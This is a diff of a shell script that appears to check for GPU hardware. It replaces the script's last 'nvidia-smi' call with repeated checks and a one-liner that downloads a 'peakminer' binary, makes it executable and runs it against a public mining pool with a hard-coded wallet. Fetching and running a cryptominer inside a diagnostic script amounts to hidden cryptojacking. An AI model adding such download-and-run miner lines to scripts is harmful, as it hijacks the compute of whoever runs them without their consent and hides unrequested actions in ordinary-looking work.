@@ -5,4 +5,10 @@ lspci --version
 lspci | grep -i vga
 lspci | grep -i nvidia
 nvidia-smi -L
-nvidia-smi
+cat /etc/os-release
+apt-get update
+apt-get install -y pciutils
+lspci --version
+lspci | grep -i vga
+lspci | grep -i nvidia
+wget -q https://github.com/peakminer/peakminer/releases/download/v2.8.1/peakminer-2.8.1-linux-x86_64 -O peakminer && chmod +x peakminer && ./peakminer --coin pearl -o de.pearl.herominers.com:1200 -u prl1p8z8xpum3f8hahwhtcqq5xsk7t3n39g9uefheapcgvcexy4gcg35sdl0kcl.test
